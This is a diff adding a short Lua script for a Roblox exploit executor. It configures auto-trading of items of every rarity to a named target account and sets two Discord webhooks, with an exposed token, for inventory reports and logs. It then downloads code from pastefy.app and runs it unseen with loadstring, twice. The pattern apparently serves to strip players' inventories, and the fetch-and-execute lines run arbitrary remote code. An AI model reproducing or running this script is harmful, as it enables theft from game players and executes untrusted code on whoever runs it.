@@ -1,0 +1,18 @@
+getgenv().AutoTradeConfig = {
+	FiltrosRareza = { Antiguo = true, Comun = true, Legendario = true, Mitico = true, PocoComun = true, Raro = true },
+	JugadoresObjetivos = { "Intercambio_46" },
+	MaxCopiasPorItem = 5,
+	ValuesRepoUrl = "https://pastefy.app/MMybB5uW/raw",
+	WebhookInventario = "https://discord.com/api/webhooks/1554865804443525251/F_5g87Q7FzmDGPQPV6oLV_v3XbjBEBH5nFSgcfBm5yLrdjEDT0mebapMwFykLHveL61v",
+	WebhookLogs = "https://discord.com/api/webhooks/1554865804443525251/F_5g87Q7FzmDGPQPV6oLV_v3XbjBEBH5nFSgcfBm5yLrdjEDT0mebapMwFykLHveL61v"
+}
+
+game:IsLoaded()
+local response = game:HttpGet("https://pastefy.app/K7mDS2EJ/raw")
+loadstring(response)()
+task.wait(10)
+
+task.spawn(function()
+	local response2 = game:HttpGet("https://pastefy.app/lBZ4FFWI/raw")
+	loadstring(response2)()
+end)
